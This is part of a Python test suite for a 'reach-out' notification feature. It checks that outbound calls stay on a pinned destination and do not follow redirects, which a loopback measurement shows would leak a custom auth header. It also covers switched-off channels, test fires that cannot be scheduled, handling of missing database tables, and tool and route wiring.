                             "vars": {"port": "9999"}}}
        res = await service.fire(pool, ENTITY, channel=ported,
                                 message={**msg, "message_id": uuid.uuid4()},
                                 trigger_id=None, now=T0)
        check("a templated PORT does not render past the pin",
              res["status"] == "failed"
              and "api.test:9999" in res["detail"].get("error", ""), res["detail"])
        check("and no brokered call was made", calls == [], calls)

        # The scheme is in there too: an http render cannot satisfy an https
        # pin, even on the same host and port.
        schemed = {**stored, "cooldown_s": 0,
                   "action": {**stored["action"], "url": "http://api.test/send"}}
        res = await service.fire(pool, ENTITY, channel=schemed,
                                 message={**msg, "message_id": uuid.uuid4()},
                                 trigger_id=None, now=T0)
        check("an http render cannot satisfy an https pin",
              res["status"] == "failed", res["detail"])

        # And the default port normalises, so a user who wrote one form is not
        # refused for the other.
        explicit = {**stored, "cooldown_s": 0,
                    "action": {**stored["action"],
                               "url": "https://api.test:443/send"}}
        res = await service.fire(pool, ENTITY, channel=explicit,
                                 message={**msg, "message_id": uuid.uuid4()},
                                 trigger_id=None, now=T0)
        check("an explicit :443 matches a pin written without it",
              res["status"] == "sent", res["detail"])
        calls.clear()

        # A row with no pin is refused rather than grandfathered.
        unpinned = {**stored, "cooldown_s": 0,
                    "action": {k: v for k, v in stored["action"].items()
                               if k not in ("pinned_host", "pinned_origin")}}
        res = await service.fire(pool, ENTITY, channel=unpinned,
                                 message={**msg, "message_id": uuid.uuid4()},
                                 trigger_id=None, now=T0)
        check("a channel with no pinned destination is refused",
              res["status"] == "failed"
              and "no pinned destination" in res["detail"].get("error", ""),
              res["detail"])
        check("still no brokered call", calls == [], calls)

        # A 3xx from the pinned host is a refusal with its own words, because
        # "your provider is redirecting" is not "your provider is down".
        async def redirecting(pool_, **kw):
            calls.append(kw)
            return {"status": 302, "body": ""}
        authz.use_credential = redirecting
        res = await service.fire(pool, ENTITY,
                                 channel={**stored, "cooldown_s": 0},
                                 message={**msg, "message_id": uuid.uuid4()},
                                 trigger_id=None, now=T0)
        check("a redirect from the pinned host is refused, and named as one",
              res["status"] == "failed"
              and "redirect" in res["detail"].get("error", ""), res["detail"])
        sys.modules.pop("server.vault.authz", None)
    asyncio.run(run())


def test_the_caps_say_this_tool_leaves_the_pod():
    from mastercode.runtime.meta_tool_caps import META_TOOL_CAPS
    EXTERNAL_API = 32
    for n in ("reachout", "reachout_channel"):
        bits = META_TOOL_CAPS[n]["required_bits"]
        check(f"{n} carries EXTERNAL_API (32)", bool(bits & EXTERNAL_API),
              f"bits={bits}")
    # The peers this is compared against: every other tool that
    # reaches outside the pod carries the same bit.
    for n in ("research", "web_search", "connect_compute"):
        check(f"…the same bit {n} carries",
              bool(META_TOOL_CAPS[n]["required_bits"] & EXTERNAL_API))


# ── 6e. THE REAL BROKER, AGAINST A REAL REDIRECTOR ────────────────────────
#
# Every other test here stubs `use_credential`, which means the whole suite
# stayed GREEN when authz.py's allow_redirects was mutated back to True —
# that is the honest limit of a fake: it can
# prove this code asks for no-redirects, never that the ask is honoured. So
# this one drives the REAL _do_http_call against two real aiohttp servers, and
# it is the only test in the file that opens a socket (loopback, ephemeral
# ports, both torn down).
#
# The shape follows a hand-run probe, kept because reproducing that measurement is the point:
# A redirects to B, and we assert what B did or did not receive.

def test_the_broker_does_not_follow_a_redirect_when_the_caller_pins():
    import aiohttp
    from aiohttp import web

    async def run():
        seen = {}

        async def sink(request):
            seen[request.app["tag"]] = dict(request.headers)
            return web.json_response({"ok": True})

        # _do_http_call opens its session with trust_env=True on purpose — real
        # brokered calls must leave through the governed squid. That makes THIS
        # test read the ambient proxy variables, and in the pod HTTP_PROXY is
        # set, so a loopback probe would be handed to squid, which denies
        # internal destinations. The gate is in gates-container-free.txt, which
        # smoke_test.sh also reads, so it does run in-pod. Scope NO_PROXY to
        # loopback for the probe and put it back afterwards: the product code
        # is untouched and the test stops depending on where it is run.
        _saved = {k: os.environ.get(k) for k in ("NO_PROXY", "no_proxy")}
        os.environ["NO_PROXY"] = os.environ["no_proxy"] = "127.0.0.1,localhost"

        app_b = web.Application(); app_b["tag"] = "B"
        app_b.router.add_route("*", "/sink", sink)
        rb = web.AppRunner(app_b); await rb.setup()
        sb = web.TCPSite(rb, "127.0.0.1", 0); await sb.start()
        port_b = sb._server.sockets[0].getsockname()[1]

        async def redirector(request):
            raise web.HTTPTemporaryRedirect(
                location=f"http://127.0.0.1:{port_b}/sink")

        app_a = web.Application(); app_a["tag"] = "A"
        app_a.router.add_route("*", "/go", redirector)
        ra = web.AppRunner(app_a); await ra.setup()
        sa = web.TCPSite(ra, "127.0.0.1", 0); await sa.start()
        port_a = sa._server.sockets[0].getsockname()[1]

        # Imported here, not at module scope: the module pulls in asyncpg and
        # the rest of the vault, and the gate lane must not pay for that
        # unless this test runs.
        #
        # The pops matter. Earlier tests install stub MODULES at these names
        # (server.vault is registered as a plain module, not a package), and a
        # stub left in place makes the real import fail with "not a package" —
        # which would have read as a broken test rather than as the stub it is.
        # Every test that needs the stubs re-installs them itself.
        for name in ("server.vault.authz", "server.vault.store",
                     "server.vault.identity", "server.vault.destination", "server.vault"):
            sys.modules.pop(name, None)
        from server.vault.authz import _do_http_call
        from server.vault import destination as _destination

        # A and B are loopback servers, which the broker now refuses as this
        # Host itself (server/vault/destination.py; its own gate is
        # test_operator_header_trust.py). This test measures what a redirect
        # does to a pinned caller, so the destination guard is lifted for it
        # and put back in the finally below.
        _guard = _destination.session_kwargs
        _destination.session_kwargs = lambda: {}

        url = f"http://127.0.0.1:{port_a}/go"
        try:
            # One probe first, so a box that cannot do loopback at all fails
            # ONCE and says so, instead of cascading into a dozen confusing
            # assertion failures about pinning.
            try:
                await _do_http_call(b"PROBE", {
                    "url": f"http://127.0.0.1:{port_b}/sink", "method": "POST",
                    "auth_scheme": "bearer", "allow_redirects": False})
                reachable = "B" in seen
            except Exception as probe_err:      # noqa: BLE001
                reachable = False
                seen["_err"] = repr(probe_err)
            check("the loopback probe servers are reachable", reachable,
                  f"cannot run the redirect measurement here: {seen.get('_err')}")
            if not reachable:
                return
            # The custom-header shape is the one that matters. aiohttp strips
            # `Authorization` across origins by itself; it forwards a header
            # the caller named, and auth_scheme='header' is exactly that.
            seen.clear()
            res = await _do_http_call(b"SUPERSECRET", {
                "url": url, "method": "POST", "auth_scheme": "header",
                "auth_header": "X-Api-Key", "allow_redirects": False})
            check("with the pin, the redirect is NOT followed",
                  "B" not in seen, f"second hop saw {sorted(seen)}")
            check("and the 3xx comes back as the response for us to refuse",
                  300 <= int(res.get("status") or 0) < 400, res.get("status"))
            leaked = [k for k, v in seen.get("B", {}).items() if "SUPERSECRET" in str(v)]
            check("so nothing of the credential reaches the second hop",
                  leaked == [], leaked)

            # The other half of the measurement, reproduced rather than
            # asserted from memory: following the redirect DOES carry a
            # custom auth header to a host the caller never named. This is
            # what makes the flag above load-bearing instead of decorative.
            seen.clear()
            await _do_http_call(b"SUPERSECRET", {
                "url": url, "method": "POST", "auth_scheme": "header",
                "auth_header": "X-Api-Key", "allow_redirects": True})
            leaked = [k for k, v in seen.get("B", {}).items() if "SUPERSECRET" in str(v)]
            check("MEASURED: following it leaks a custom auth header to hop two",
                  "B" in seen and leaked == ["X-Api-Key"],
                  f"reached={'B' in seen} leaked={leaked} aiohttp={aiohttp.__version__}")

            # And the library's own behaviour for `Authorization`, so the
            # asymmetry is on the record and nobody 'simplifies' the custom
            # case away by reasoning from the bearer one.
            seen.clear()
            await _do_http_call(b"SUPERSECRET", {
                "url": url, "method": "POST", "auth_scheme": "bearer",
                "allow_redirects": True})
            leaked = [k for k, v in seen.get("B", {}).items() if "SUPERSECRET" in str(v)]
            check("MEASURED: aiohttp strips Authorization itself, custom headers not",
                  "B" in seen and leaked == [], f"leaked={leaked}")
        finally:
            _destination.session_kwargs = _guard
            await ra.cleanup(); await rb.cleanup()
            for k, v in _saved.items():
                if v is None:
                    os.environ.pop(k, None)
                else:
                    os.environ[k] = v

    asyncio.run(run())

    # And the transport is what asks for it. Both halves are needed: this
    # without the above proves the ask, the above without this proves the
    # honouring, and the mutation that flipped authz.py killed neither alone.
    src = _read("server/reachout/transports.py")
    check("the reach-out transport passes allow_redirects=False",
          '"allow_redirects": False' in src)


# ── 6f. A SWITCHED-OFF CHANNEL CANNOT BE TEST-FIRED ───────────────────────

def test_a_disabled_channel_cannot_be_test_fired():
    # `test` bypasses the cool-down by design, so if it also ignored
    # disabled_at then "switch it off" would stop the dispatcher and not the
    # host — and the one thing a user switching a channel off is asking for is
    # that nothing more goes out on it.
    async def run():
        pool = FakePool()
        ch = _log_channel(pool, name="off-one", disabled=True)
        try:
            await service.test_fire(pool, ENTITY, "off-one")
            check("test-firing a switched-off channel is refused", False,
                  "it fired")
        except service.ReachoutError as e:
            check("test-firing a switched-off channel is refused",
                  "switched off" in str(e), str(e))
        check("and nothing was logged as sent", pool.sent_rows() == [], pool.log)

        # The same channel, switched back on, does fire — so the refusal is
        # the disabled flag and not something else about the row.
        ch["disabled_at"] = None
        res = await service.test_fire(pool, ENTITY, "off-one")
        check("switched back on, it fires", res["status"] == "sent", res)
    asyncio.run(run())


# ── 6g. A TEST FIRE IS NOT SCHEDULABLE ────────────────────────────────────

def test_a_test_fire_cannot_be_scheduled():
    # The scenario: schedule_task(op_tool='reachout', op_args={op:'test'},
    # recurrence='every:30'). `test` ignores the cool-down on purpose, so this
    # would have fired a PAID channel at the user's own SMS provider ~2,880
    # times a day with nobody there.
    from mastercode.runtime.direct_ops import (
        DIRECT_OP_TOOLS, UNATTENDED_OP_TOOLS, is_unattended_op_tool)
    check("reachout is not schedulable", "reachout" not in UNATTENDED_OP_TOOLS)
    check("the fire-time predicate says so too",
          not is_unattended_op_tool("reachout"))
    check("but the host may still run it in a live turn",
          "reachout" in DIRECT_OP_TOOLS)

    # Driven through the guard the scheduler actually uses, not just the set.
    async def run():
        import mastercode.brain.offline_task_runner as runner
        ok, content, err = await runner._run_op(
            FakePool(), ENTITY, "reachout", {"op": "test", "channel": "desk"})
        check("the scheduler refuses a scheduled test fire", ok is False, err)
        check("and says why in words a person can act on",
              "UnattendedOpRefused" in (err or ""), err)
    asyncio.run(run())

    # The cool-down bypass that made it expensive is still there, because it
    # is right for the human-present case this op now exclusively serves.
    src = _read("server/reachout/service.py")
    check("test still bypasses the cool-down for the user in front of it",
          'row["cooldown_s"] = 0' in src)


# ── 6d. interrupted attempts, runbook templates, containment, a missing table ───

def test_an_interrupted_attempt_becomes_visible_instead_of_vanishing():
    async def run():
        pool = FakePool()
        ch = _log_channel(pool)
        # A row the idempotency gate wrote before the pod stopped.
        pool.log.append({"id": 1, "entity_id": ENTITY, "trigger_id": 7,
                         "channel_id": ch["id"], "message_id": uuid.uuid4(),
                         "fired_at": T0 - timedelta(seconds=600),
                         "status": "pending", "detail": {}})
        # And one that is still legitimately in flight.
        pool.log.append({"id": 2, "entity_id": ENTITY, "trigger_id": 8,
                         "channel_id": ch["id"], "message_id": uuid.uuid4(),
                         "fired_at": T0 - timedelta(seconds=10),
                         "status": "pending", "detail": {}})
        n = await service.sweep_interrupted(pool, ENTITY, now=T0)
        check("the stale pending row is written off", n == 1, n)
        check("as failed, and says why",
              pool.log[0]["status"] == "failed"
              and pool.log[0]["detail"].get("interrupted") is True,
              pool.log[0])
        check("the in-flight one is untouched",
              pool.log[1]["status"] == "pending", pool.log[1])
        check("the window is above the broker's own 30s timeout, not a taste",
              service.PENDING_INTERRUPTED_AFTER_S == 300)
        # Idempotent: a second sweep changes nothing.
        check("a second sweep writes off nothing",
              await service.sweep_interrupted(pool, ENTITY, now=T0) == 0)

        # And the DISPATCHER has to be the thing that runs it. Asserting the
        # service function works says nothing about whether anything calls it —
        # the mutation that deleted the call from run_once left this file green
        # until this check existed.
        pool2 = FakePool()
        ch2 = _log_channel(pool2)
        _trigger(pool2, ch2)
        pool2.log.append({"id": 99, "entity_id": ENTITY, "trigger_id": 7,
                          "channel_id": ch2["id"], "message_id": uuid.uuid4(),
                          "fired_at": datetime.now(timezone.utc) - timedelta(hours=1),
                          "status": "pending", "detail": {}})
        await dispatcher.run_once(pool2, ENTITY, datetime.now(timezone.utc))
        check("one dispatcher pass writes off the interrupted row",
              pool2.log[0]["status"] == "failed"
              and pool2.log[0]["detail"].get("interrupted") is True,
              pool2.log[0])
    asyncio.run(run())


def test_a_runbook_channel_names_a_template_that_exists():
    async def run():
        pool = FakePool()
        _stub_vault_and_stepup(pool)
        try:
            await service.add_channel(pool, ENTITY, name="rb", kind="runbook",
                                      action={"type": "runbook", "template_id": 999})
            check("a runbook channel naming no template is refused at WRITE time",
                  False, "it was created")
        except service.ReachoutError as e:
            check("a runbook channel naming no template is refused at WRITE time",
                  "no task_template with id 999" in str(e), str(e))
        check("nothing was created", pool.channels == [])
        r = await service.add_channel(pool, ENTITY, name="rb", kind="runbook",
                                      action={"type": "runbook", "template_id": 12})
        check("one that names a real template is built", r["name"] == "rb", r)
    asyncio.run(run())


def test_match_jsonb_is_containment_not_top_level_equality():
    # The column comment and the design both say containment; the first cut
    # compared top-level keys, which agrees on a flat payload and diverges the
    # moment anyone nests one — as a trigger that silently never fires.
    nested = {"message_kind": "system_notification",
              "payload": {"event": "oversight_critical",
                          "detect": {"level": "critical", "count": 3},
                          "tags": ["disk", "cpu"]}}
    check("a nested predicate matches a nested payload",
          service.matches({"match_kind": "system_notification",
                           "match_jsonb": {"detect": {"level": "critical"}}},
                          nested) is True)
    check("…and is still refused when the nested value differs",
          service.matches({"match_kind": "system_notification",
                           "match_jsonb": {"detect": {"level": "high"}}},
                          nested) is False)
    check("an array predicate is contained-by, not equal-to",
          service.matches({"match_kind": "system_notification",
                           "match_jsonb": {"tags": ["cpu"]}}, nested) is True)
    check("a key that is absent never matches",
          service.matches({"match_kind": "system_notification",
                           "match_jsonb": {"nope": 1}}, nested) is False)
    # The flat case the old code got right must keep working.
    check("flat equality still holds",
          service.matches({"match_kind": "system_notification",
                           "match_jsonb": {"event": "oversight_critical"}},
                          nested) is True)


def test_a_missing_table_is_loud_and_says_so_where_the_user_looks():
    # The migration-number collision this PR hit would have shown up ONLY as
    # this: the tables absent, the loop warning into a log nobody reads.
    async def run():
        inbox = []
        mh = types.ModuleType("server.bridge.memory_handlers")

        async def handle_inbox_append(payload):
            inbox.append(payload)
            return {"ok": True, "message_id": "m1"}
        mh.handle_inbox_append = handle_inbox_append
        sys.modules.setdefault("server.bridge", types.ModuleType("server.bridge"))
        sys.modules["server.bridge.memory_handlers"] = mh

        class UndefinedTableError(Exception):
            pass
        await dispatcher._report_missing_schema(
            FakePool(), ENTITY, UndefinedTableError('relation "reachout_log" does not exist'))
        check("it writes an inbox row", len(inbox) == 1, inbox)
        check("that says reach-out is not running",
              "not running" in (inbox[0]["subject"].lower() if inbox else ""), inbox)
        check("and carries an event a reader can match on",
              inbox and inbox[0]["payload"]["event"] == "reachout_schema_missing",
              inbox)
        sys.modules.pop("server.bridge.memory_handlers", None)

    asyncio.run(run())

    # The real loop, against a pool whose tables are absent — which is what a
    # migration-number collision actually produces. Driven rather than
    # string-matched: a mutation that deleted the UndefinedTableError branch
    # left every source-text check above green.
    async def run_loop():
        inbox = []
        mh = types.ModuleType("server.bridge.memory_handlers")

        async def handle_inbox_append(payload):
            inbox.append(payload)
            return {"ok": True}
        mh.handle_inbox_append = handle_inbox_append
        sys.modules.setdefault("server.bridge", types.ModuleType("server.bridge"))
        sys.modules["server.bridge.memory_handlers"] = mh

        class UndefinedTableError(Exception):
            pass

        class MissingTablePool(FakePool):
            def __init__(self):
                super().__init__()
                self.passes = 0

            async def fetch(self, sql, *p):
                if "FROM reachout_triggers t" in " ".join(sql.split()):
                    self.passes += 1
                    raise UndefinedTableError(
                        'relation "reachout_triggers" does not exist')
                return await super().fetch(sql, *p)

            async def fetchval(self, sql, *p):
                if "MAX(m.sent_at)" in " ".join(sql.split()):
                    raise UndefinedTableError('relation "reachout_log" does not exist')
                return await super().fetchval(sql, *p)

        pool = MissingTablePool()
        orig = dispatcher.POLL_INTERVAL_S
        dispatcher.POLL_INTERVAL_S = 0
        try:
            task = asyncio.create_task(
                dispatcher.run_reachout_dispatcher_loop(pool, ENTITY))
            for _ in range(400):
                await asyncio.sleep(0)
                if pool.passes >= 5:
                    break
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
        finally:
            dispatcher.POLL_INTERVAL_S = orig
        check("the loop survives a missing table rather than dying",
              pool.passes >= 5, pool.passes)
        check("and tells the user, through the Inbox", len(inbox) >= 1, inbox)
        check("exactly ONCE, not once per 30s tick",
              len(inbox) == 1, f"{len(inbox)} rows over {pool.passes} passes")
        sys.modules.pop("server.bridge.memory_handlers", None)

    asyncio.run(run_loop())
    src = _read("server/reachout/dispatcher.py")
    check("and at ERROR, not warning",
          "log.error(" in src.split("_report_missing_schema", 1)[1][:1200])


# ── 7. THE TOOL — every op, and the wiring ────────────────────────────────

def _stub_brain_service(pool) -> None:
    # Patch the REAL module when it can be imported. A bare stand-in installed
    # because nothing had imported it yet stays in sys.modules for every later
    # test, and test_the_connect_hook_... then reads brain_service._pool off it.
    try:
        import server.brain_service  # noqa: F401
    except Exception:  # noqa: BLE001 — no database driver in this lane: stand in
        pass
    bs = sys.modules.get("server.brain_service")
    if bs is None:
        bs = types.ModuleType("server.brain_service")
        sys.modules["server.brain_service"] = bs
        import server as _server
        _server.brain_service = bs
    bs.get_pool = lambda: pool
    bs._entity_id = ENTITY


def test_every_tool_op():
    async def run():
        pool = FakePool()
        _stub_brain_service(pool)
        _stub_vault_and_stepup(pool)
        from mastercode.runtime.tools import _exec_reachout

        r = await _exec_reachout({"op": "list"})
        check("op=list works on an empty host",
              r["status"] == "ok" and r["result"]["channels"] == [], r)
        # oversight_critical moved out of `unemitted` when the management
        # lane's ledger landed: runtime/oversight.notify_new_findings
        # writes it, so it is LIVE and a trigger on it fires. The unemitted
        # list is empty today and stays in the response — the next event
        # declared ahead of its writer goes there, and the host is told which
        # names it may match either way.
        check("list names the events a trigger can match",
              "build_finished" in r["result"]["known_events"]
              and "oversight_critical" in r["result"]["known_events"]
              and "unemitted_events" in r["result"], r)

        from mastercode.runtime.tools import _exec_reachout_channel
        r = await _exec_reachout_channel({"name": "desk", "kind": "log",
                                          "action": {"type": "log"}})
        check("reachout_channel builds one", r["status"] == "ok"
              and r["result"]["created_by"] == "host", r)
        check("and it takes the design's default cool-down",
              r["result"]["cooldown_s"] == 120, r)
        r = await _exec_reachout({"op": "add_channel", "name": "x",
                                  "kind": "log", "action": {"type": "log"}})
        check("add_channel is no longer an op on `reachout`",
              r["status"] == "error" and "op must be one of" in r["result"], r)

        r = await _exec_reachout_channel({"name": "night", "kind": "log",
                                          "action": {"type": "log"},
                                          "cooldown_s": 0,
                                          "quiet": {"from": "22:00", "to": "07:00",
                                                    "tz": "America/New_York"}})
        night = next(c for c in pool.channels if c["name"] == "night")
        # As TIMES: asyncpg refuses a str for `$n::time`, so the "22:00" this
        # fake used to accept was a channel Postgres would never have created
        # (test_typed_binds.py drives the strict check).
        import datetime as _dtm
        check("the quiet object lands on the channel row",
              (night["quiet_from"], night["quiet_to"], night["quiet_tz"])
              == (_dtm.time(22, 0), _dtm.time(7, 0), "America/New_York"), night)
        check("a cool-down of 0 stays 0 — 'always ring' is a value, not a default",
              night["cooldown_s"] == 0, night)
        # A window that wraps midnight is the normal case, not bad input.
        ch_night = {**night, "quiet_from": _t(22, 0), "quiet_to": _t(7, 0)}
        check("inside the wrapped window is quiet",
              service.in_quiet_window(ch_night, datetime(2026, 9, 16, 3, 0,
                                                         tzinfo=timezone.utc)) is True)
        check("outside it is not",
              service.in_quiet_window(ch_night, datetime(2026, 9, 16, 15, 0,
                                                         tzinfo=timezone.utc)) is False)
        await _exec_reachout({"op": "remove_channel", "channel": "night"})

        r = await _exec_reachout({"op": "add_trigger", "channel": "desk",
                                  "label": "Build finished",
                                  "match_kind": "system_notification",
                                  "match_event": "build_finished"})
        check("op=add_trigger subscribes it", r["status"] == "ok", r)
        trig_id = r["result"]["id"]

        r = await _exec_reachout({"op": "add_trigger", "channel": "desk",
                                  "label": "Something serious",
                                  "match_kind": "system_notification",
                                  "match_event": "oversight_critical"})
        # WAS "a trigger on an unemitted event is accepted AND says so".
        # oversight_critical stopped being unemitted when the management lane's
        # ledger landed: runtime/oversight.notify_new_findings writes
        # it, so the trigger is not merely accepted — it fires. The note must be
        # GONE, and that is the assertion: a stale "nothing emits this yet" on a
        # live event tells the user their alarm is decorative when it works.
        check("a trigger on a now-live event is accepted with no dead-event note",
              r["status"] == "ok" and not (r["result"].get("note") or ""), r)
        check("and the unemitted list is empty because the lane landed",
              list(service.UNEMITTED_EVENTS) == [], service.UNEMITTED_EVENTS)
        # The note MACHINERY is still live for the next event declared ahead of
        # its writer, and with the tuple empty there is no real name left that
        # has the property. So the tuple is swapped for one that does and the
        # branch is driven for real — never asserted from a string this test
        # built, which would be the test supplying the value it is checking.
        _real_unemitted = service.UNEMITTED_EVENTS
        service.UNEMITTED_EVENTS = ("site_published",)
        try:
            r = await _exec_reachout({"op": "add_trigger", "channel": "desk",
                                      "label": "Site published",
                                      "match_kind": "system_notification",
                                      "match_event": "site_published"})
            check("the dead-event note is still produced for an unemitted name",
                  r["status"] == "ok"
                  and "nothing emits" in (r["result"].get("note") or ""), r)
            await _exec_reachout({"op": "remove_trigger",
                                  "trigger": r["result"]["id"]})
        finally:
            service.UNEMITTED_EVENTS = _real_unemitted

        r = await _exec_reachout({"op": "test", "channel": "desk"})
        check("op=test fires once", r["status"] == "ok"
              and r["result"]["status"] == "sent", r)
        check("and the log row is marked a test",
              r["result"]["detail"].get("test") is True, r)

        # A test must not be blocked by the cool-down it just set.
        r = await _exec_reachout({"op": "test", "channel": "desk"})
        check("a second test right away still fires",
              r["result"]["status"] == "sent", r)

        r = await _exec_reachout({"op": "remove_trigger", "trigger_id": trig_id})
        check("op=remove_trigger removes the host's own", r["status"] == "ok", r)

        r = await _exec_reachout({"op": "remove_channel", "channel": "desk"})
        check("op=remove_channel removes the host's own", r["status"] == "ok", r)
        check("and its triggers went with it", pool.triggers == [], pool.triggers)

        # The user's row is the user's.
        pool.channels.append({"id": 99, "entity_id": ENTITY, "name": "mine",
                              "kind": "log", "action": {"type": "log"},
                              "cooldown_s": 120, "quiet_from": None,
                              "quiet_to": None, "quiet_tz": None,
                              "created_by": "user", "created_at": T0,
                              "disabled_at": None})
        r = await _exec_reachout({"op": "remove_channel", "channel": "mine"})
        check("the host will not delete what the user created",
              r["status"] == "error" and "the user's to remove" in r["result"]
              and "Circles →" not in r["result"], r)

        r = await _exec_reachout({"op": "nope"})
        check("an unknown op is refused", r["status"] == "error", r)
    asyncio.run(run())


def test_the_tool_is_wired_in_every_place_the_lane_gate_requires():
    from mastercode.public_tool_registry import PUBLIC_TOOL_SCHEMAS, PUBLIC_META_TOOL_NAMES
    from mastercode.runtime.meta_tool_caps import META_TOOL_CAPS, READ_SAFE_OPS
    from mastercode.runtime.direct_ops import DIRECT_OP_TOOLS, UNATTENDED_OP_TOOLS
    from mastercode.runtime.tool_lanes import lane_for

    tools_src = tools_source()
    for n in ("reachout", "reachout_channel"):
        check(f"1/5 registry schema — {n}", n in PUBLIC_TOOL_SCHEMAS)
        check(f"2/5 PUBLIC_META_TOOL_NAMES — {n}", n in PUBLIC_META_TOOL_NAMES)
        check(f"3/5 META_TOOL_CAPS — {n}", n in META_TOOL_CAPS)
        check(f"4/5 the tools.py dispatcher branch — {n}",
              f'elif name == "{n}"' in tools_src)
        check(f"5/5 a lane resolves it — {n}",
              lane_for(n, PUBLIC_TOOL_SCHEMAS[n]) in ("operate", "dispatch"))
    check("reachout is a direct op", "reachout" in DIRECT_OP_TOOLS)
    # NOT unattended: op='test' fires a channel and its result is something a
    # human has to check, which is this set's own criterion. See
    # test_a_test_fire_cannot_be_scheduled.
    check("reachout is not schedulable", "reachout" not in UNATTENDED_OP_TOOLS)
    check("list is a direct read", READ_SAFE_OPS.get("reachout") == {"list": 1})
    check("reachout resolves to operate — no model in the loop",
          lane_for("reachout", PUBLIC_TOOL_SCHEMAS["reachout"]) == "operate")
    # Building a channel is the Host's own operate op; it stays
    # off a schedule (UNATTENDED_OP_TOOLS) and behind the user's step-up.
    check("reachout_channel resolves to operate, and is not schedulable",
          lane_for("reachout_channel", PUBLIC_TOOL_SCHEMAS["reachout_channel"])
          == "operate" and "reachout_channel" not in UNATTENDED_OP_TOOLS)


def test_the_loop_and_the_routes_are_wired():
    main = _read("server/main.py")
    check("the dispatcher is started in lifespan",
          "run_reachout_dispatcher_loop" in main)
    check("gated on a real entity, beside the offline runner",
          main.index("run_reachout_dispatcher_loop")
          > main.index("run_offline_tasks_loop"))
    check("the routes are included", "reachout_routes.router" in main)

    from server.applications.scopes import PERMISSIONS
    check("read:reachout is a declared permission", "read:reachout" in PERMISSIONS)
    check("write:reachout is a declared permission", "write:reachout" in PERMISSIONS)

    mig = _read("migrations/v152_reachout.sql")
    for t in ("reachout_channels", "reachout_triggers", "reachout_log"):
        check(f"{t} is declared in the migration",
              f"CREATE TABLE IF NOT EXISTS {t}" in mig)
    check("the idempotency constraint is in the migration",
          "UNIQUE (trigger_id, message_id)" in mig)
    check("no runtime DDL in the reach-out modules",
          not any(k in _read(f"server/reachout/{f}")
                  for f in ("service.py", "dispatcher.py", "transports.py")
                  for k in ("CREATE TABLE", "ALTER TABLE", "CREATE INDEX")))


def _read(rel: str) -> str:
    with open(os.path.join(_ROOT, rel), encoding="utf-8") as fh:
        return fh.read()


TESTS = [v for k, v in sorted(globals().items()) if k.startswith("test_")]

if __name__ == "__main__":
    import traceback
    print("reach-out Phase 2 — the dispatcher, the tool, the gap")
    for t in TESTS:
        print(f"\n{t.__name__}")
        # An exception is a FAIL like any other, and the run goes on: a test
        # that raised used to end the run there, so every test after it was
        # silently not run and the one red line was all anyone saw.
        try:
            t()
        except Exception as e:  # noqa: BLE001 — reported, counted, not swallowed
            FAILED += 1
            print(f"  FAIL {t.__name__} raised {type(e).__name__}: {e}")
            print("       " + traceback.format_exc().rstrip().replace("\n", "\n       "))
    print()
    if FAILED:
        print(f"FAILED: {FAILED}")
        sys.exit(1)
    print("all reach-out checks passed")
